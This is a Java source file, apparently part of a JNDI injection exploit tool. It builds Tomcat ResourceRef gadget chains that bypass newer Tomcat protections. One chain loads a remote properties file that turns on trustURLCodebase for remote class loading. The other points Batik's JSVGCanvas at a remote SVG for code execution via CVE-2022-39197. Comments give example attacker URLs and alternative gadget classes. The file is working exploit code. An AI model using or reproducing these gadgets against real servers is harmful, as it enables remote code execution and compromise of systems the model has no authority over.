package sonomon.jndi.factory;

import javax.naming.StringRefAddr;

import org.apache.naming.ResourceRef;

public class GenericFactory {
	static String factory = "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory";
	public static ResourceRef configbypass(String url){
		//此链是为了应对高版本tomcat BeanFactory没有forceString
		
		//url = "http://127.0.0.1:81/exp.properties";
		//exp.properties内容如下,可以篡改jdk环境变量,但面对tomcat/spring环境无法生效,原理见https://xz.aliyun.com/t/13127
		//对于篡改tocmat一些配置可能需要开启热加载
		
		//os.name=Windows 10
		//com.sun.jndi.ldap.object.trustURLCodebase=true
		//com.sun.jndi.rmi.object.trustURLCodebase=true
		
		//使用BeanFactory调setter会检测是否存在对应的属性,GenericNamingResourcesFactory则不用,因此GenericNamingResourcesFactory更加通用
		//实际测试时低版本tomcat有时候无法用GenericNamingResourcesFactory
		//替代类如下
		//org.apache.commons.configuration2.SystemConfiguration //commons-configuration2
		//org.apache.groovy.util.SystemUtil  //groovy >= 3.0才有的
	    ResourceRef ref = new ResourceRef("org.apache.commons.configuration.SystemConfiguration", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("systemProperties", url));
        return ref;  
	}
	
	public static ResourceRef svgbypass(String url){
		//此链是为了应对高版本tomcat BeanFactory没有forceString
		
		//url = "http://127.0.0.1:81/RCE.svg";
		//详情见CVE-2022-39197
		//实际用起来似乎因为classloader的原因,没法远程加载jar包,只能依赖js.jar进行XSS-RCE
	    ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("URI", url));
        return ref;  
	}
}
